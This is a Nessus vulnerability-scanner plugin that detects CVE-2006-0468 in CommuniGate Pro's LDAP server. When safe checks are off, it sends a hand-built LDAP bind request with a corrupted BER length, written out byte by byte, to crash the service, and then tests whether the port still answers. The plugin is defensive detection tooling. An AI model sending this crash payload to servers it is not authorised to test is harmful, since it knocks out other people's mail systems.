#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20827);
  script_version("$Revision: 1.21 $");

  script_cve_id("CVE-2006-0468");
  script_bugtraq_id(16407);
  script_osvdb_id(22787, 22788);

  script_name(english:"CommuniGate Pro Server < 5.0.7 LDAP BER Decoding Multiple Vulnerabilities");
  script_summary(english:"Checks for denial of service vulnerability in CommuniGate Pro LDAP module");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote application is prone to denial of service attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running CommuniGate Pro, a commercial
email and groupware application. 

The version of CommuniGate Pro installed on the remote host includes
an LDAP server that reportedly fails to handle requests with negative
BER lengths.  A user can leverage this issue to crash not just the
LDAP server but also the entire application on the remote host. 
Remote code execution may even be possible." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/423364" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ea9f16ac" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?10470ceb" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to CommuniGate Pro version 5.0.7 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/01/31");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/01/27");
 script_cvs_date("$Date: 2012/06/14 00:42:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:communigate:communigate_pro_core_server");
script_end_attributes();

 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Windows");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("smtpserver_detect.nasl", "ldap_detect.nasl");
  script_require_ports("Services/smtp", 25, "Services/ldap", 389);

  exit(0);
}


include("global_settings.inc");
include("smtp_func.inc");


ldap_port = get_kb_item("Services/ldap");
if (!ldap_port) ldap_port = 389;
if (!get_port_state(ldap_port)) exit(0);


smtp_port = get_kb_item("Services/smtp");
if (!smtp_port) smtp_port = 25;
if (!get_port_state(smtp_port)) exit(0);
banner = get_smtp_banner(port:smtp_port);
if ( ! banner ) exit(0);


# Unless we're paranoid, make sure the SMTP banner looks like CommuniGate Pro.
if (report_paranoia < 2) {
  if ( "ESMTP CommuniGate Pro" >!< banner) exit(0);
}


# If safe checks are enabled...
if (safe_checks()) {
  # Check the version number in the SMTP banner.
  if (
    banner && 
    egrep(pattern:"^220 .* CommuniGate Pro ([0-4]\.|5\.0\.[0-6])", string:banner)
  ) {
    report = string(
      "Nessus has determined the flaw exists with the application\n",
      "simply by looking at the version in the SMTP banner.\n"
    );

    security_hole(port:ldap_port, extra:report);
  }
 exit(0);
}
# Otherwise try to crash it.
else {
  # A bad request.
  req = raw_string(
    0x30,                              # universal sequence
    0x12,                              # length of the request
    0x02, 0x01, 0x01,                  # message id (1)
    0x60,                              # bind request
    0x0d,                              #   length
    0x02, 0x01, 0x03,                  #   version (3)
    0x04, 0x02, 0x44, 0x43,            #   name ("DC")
    0x80, 0x84, 0xff, 0xff, 0xff, 0xff #   authentication (corrupted)
  );

  # Open a socket and send the request.
  soc = open_sock_tcp(ldap_port);
  if (soc) {
    send(socket:soc, data:req);
    res = recv(socket:soc, length:1024);
    close(soc);

    # If we didn't get anything back, check whether it crashed.
    if (res == NULL) {
      soc2 = open_sock_tcp(ldap_port);
      # There's a problem if we can't reconnect.
      if (!soc2) {
        security_hole(ldap_port);
        exit(0);
      }
      else close(soc2);
    }
  }
}
